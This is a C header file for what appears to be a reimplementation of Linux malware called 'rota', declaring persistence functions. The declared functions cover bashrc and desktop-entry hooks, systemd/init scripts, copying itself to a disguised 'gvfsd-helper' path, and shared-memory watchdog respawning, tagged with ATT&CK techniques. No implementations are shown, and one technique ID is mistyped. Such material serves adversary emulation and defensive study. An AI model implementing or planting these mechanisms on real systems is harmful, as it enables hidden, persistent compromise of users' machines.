#ifndef PERSISTENCE_H_
#define PERSISTENCE_H_
#include <stdbool.h>

/**
* @brief append to bashrc for persistence
* Technique: Event Triggered Execution: Unix Shell Configuration Modification (T154.004)
* @param: N/A
* @return: boolean indicating success/failue of file creation.
**/

bool nonroot_bashrc_persistence(void);

/**
* @brief append to bashrc for persistence
* Technique: Desktop Entry (not documented in ATT&CK)
* @param: N/A
* @return: boolean indicating success/failue of file creation.
**/
bool nonroot_desktop_persistence(void);


/**
 * @brief copy binary by reading it from /proc/self/exe to destpath
 * @param destpath, designated path to write to.
 *
 * @return boolean value indicating success/failure.
 **/
bool copy_rota_to_userland(char *destpath);

/**
 * @brief wrapper function to call additional non-root persistence functions
 * required directories are created at execution time for planting the binary.
 * @param N/A
 * @return boolean value indicating success or failureof non-root persistence methods.
*/
bool nonroot_persistence(void);

/**
 * @brief Leverage systemd/init rc scripts to achieve persistence when rota is executed as root.
 * Technique: Boot or Logon Initiaization Scripts
 * TID: 1037.004
 * https://attack.mitre.org/techniques/T1037/
 * @param N/A
 * @return boolean value if successfully installed persistence.
 **/
bool root_persistence(void);


/**
*
* @brief monitor /proc/<PID> for existence of a given process.
* @param pid, integer value corresponding to a given process.
* @return boolean value indicating file in proc exists or not.
**/
bool monitor_proc(char *pid);

/**
 * @brief helper function to write data to disk
 * @param fpath char pointer to location on filepath.
 * @param data, buffer of data to write to previously specified filepath.
 * @return boolean value indicating success or failure.
 * */
bool write_to_file(char *fpath, char *data);



/**
 * @brief intial watchdog_thread, monitor shared memory for existence of other file.
 * this function is started via a thread.
 * @param char pointer to file path to exec (rota binary)
 * @return N/A
 * */
void *watchdog_process_shmget(void *fpath);


/**
 *@brief secondary watchdog_thread, read shared memory for existence of other file
 *@param fpath char pointer to file path to exec (rota binary)
 *@return N/A
 * */
void *watchdog_process_shmread(void *fpath);

/**
 * @brief spawn a thread for persistence IPC watchdog processes
 * @param uid to indicate which watchdog to spawn
 * @param fpath file path to rota  (~/.gvfsd/.prolfile/gvfsd-helper)
 * @return N/A
 **/
void spawn_thread_watchdog(int some_id, char *fpath);


/**
 * @brief fork and exec a binary and wait for it to return
 * @param fpath, char pointer to file path to fork/exec.
 * @return N/A
 * */
void fork_exec(char *fpath);

#endif // PERSISTENCE_H_
